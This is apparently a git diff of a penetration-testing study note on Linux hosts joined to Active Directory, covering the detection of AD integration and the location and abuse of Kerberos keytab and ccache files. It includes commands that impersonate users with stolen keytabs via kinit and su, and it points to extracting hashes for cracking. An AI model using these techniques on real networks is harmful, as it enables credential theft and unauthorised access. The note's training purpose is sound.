@@ -1,5 +1,5 @@
 ### Content
-- [Check whether the Linux server is integrated with AD](#check-whether-the-linux-server-is-integrated-with-ad)
+- [Identifying Linux and Active Directory Integration](#identifying-linux-and-active-directory-integration)
 - [Keytab and ccache files](#keytab-and-ccache-files)
 	- [Keytab](#keytab)
 		- [Finding Keytab Files](#finding-keytab-files)
@@ -13,16 +13,9 @@
 
 > [!Notes]
 > A Linux machine can be connected to AD. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network, even if it's not connected to AD, it could use Kerberos tickets in scripts or to authenticate to the network.
-> 
-> **[keytab](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/keytab_def.html)**
-> A file that contains pairs of Kerberos principals and their corresponding encrypted keys. Keytab can be copied from a machine to another, any machine with kerberos client can create a keytab file. You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.
->
-> **[Ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)**
-> A credential cache (ccache) file stores Kerberos tickets that are issued after authentication. (protected w and r rights)
-> Stored by default in `/tmp` and the path to this file is placed in the `KRB5CCNAME` environment variable.
 
 ---
-# Check whether the Linux server is integrated with AD
+# Identifying Linux and Active Directory Integration
 
 > Read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details.
 
@@ -31,8 +24,8 @@
 	$ realm list
 	domain
 		type: kerberos
-		realm-name: domain
-		domain-name: domain
+		realm-name: DOMAINNAME
+		domain-name: domainName
 		configured: kerberos-member
 		server-software: active-directory
 		client-software: sssd
@@ -42,22 +35,23 @@
 		required-package: libpam-sss
 		required-package: adcli
 		required-package: samba-common-bin
-		login-formats: %U@domain
+		login-formats: %U@domainName
 		login-policy: allow-permitted-logins
-		permitted-logins: user1@domain, user2@domain
+		permitted-logins: user1@domainName, user2@domainName
 		permitted-groups: Linux Admins
 	```
 - To integrate the Linux server with AD, we need to use either [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) or `ldap` service.
 	``` bash
 	$ ps -ef | grep -i "winbind\|sssd"
-	#  if the system is integrated with AD using SSSD service.
+	
+	# The results if the system is integrated with AD using SSSD service.
 	root     29912     1  0  2017 ?        00:19:09 /usr/sbin/sssd -f -D
 	root     29913 29912  0  2017 ?        04:36:59 /usr/libexec/sssd/sssd_be --domain 2daygeek.com --uid 0 --gid 0 --debug-to-files
 	root     29914 29912  0  2017 ?        00:29:28 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --debug-to-files
 	root     29915 29912  0  2017 ?        00:09:19 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --debug-to-files
 	root     31584 26666  0 13:41 pts/3    00:00:00 grep sssd
 	
-	# if the system is integrated with AD using winbind service.
+	# The results of if the system is integrated with AD using winbind service.
 	root       676 21055  0  2017 ?        00:00:22 **winbindd**
 	root       958 21055  0  2017 ?        00:00:35 winbindd
 	root     21055     1  0  2017 ?        00:59:07 winbindd
@@ -68,10 +62,14 @@
 	```
 ---
 # Keytab and ccache files
-
-> Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account.
-
 ## Keytab
+
+- A **persistent file** that stores **Kerberos principal names and their long-term encryption keys**.
+- Used to authenticate to various remote systems using Kerberos without entering a password.
+- To use a keytab file, we must have read and write (rw) privileges on the file.
+- See [Keytab](https://kb.iu.edu/d/aumh) for more info.
+
+> A Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account.
 #### Finding Keytab Files
 ``` bash
 # Search for it in the system by its name
@@ -80,17 +78,15 @@ $ find / -name *keytab* -ls 2>/dev/null
 $ crontab -l
 ```
 #### Abusing KeyTab Files
-Listing keytab File Information
-``` bash
-$ klist -k -t /opt/specialfiles/user.keytab
-```
 Impersonating a User with a keytab
 ``` bash
 # Confirm which ticket we are using
 $ klist
+# Listing keytab file information (ex: principal name and domain name)
+$ klist -k -t /opt/specialfiles/user.keytab
 # Import the stolen ticket, use the name of the principal as shown in klist because kinit is case sensitive 
-$ kinit user@domain -k -t /opt/specialfiles/user.keytab
-# Make sure the ticket haschanged
+$ kinit <principal> -k -t /opt/specialfiles/user.keytab
+# Make sure the ticket has changed
 $ klist
 # log in as another user
 $ su - user@admin
@@ -118,6 +114,12 @@ $ python3 keytabextract.py user.keytab
 > Use hashcat or john to crack NTLM or use [crackstation](https://crackstation.net/)
 
 ## ccache
+- A **temporary storage** that holds **Kerberos tickets** (TGT and TGS) after a user authenticates.
+- Stored in files like `/tmp/krb5cc_*` on Linux. 
+- Can be **exported and imported** (e.g., `klist`, `kinit`).
+- The current ticket is stored in the environment variable `KRB5CCNAME`.
+- **Accessing and abusing ccache files can only be done by elevated privileges.**
+- See [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) for more info.
 #### Finding ccache Files
 ``` bash
 # Reviewing Environment Variables for ccache Files.
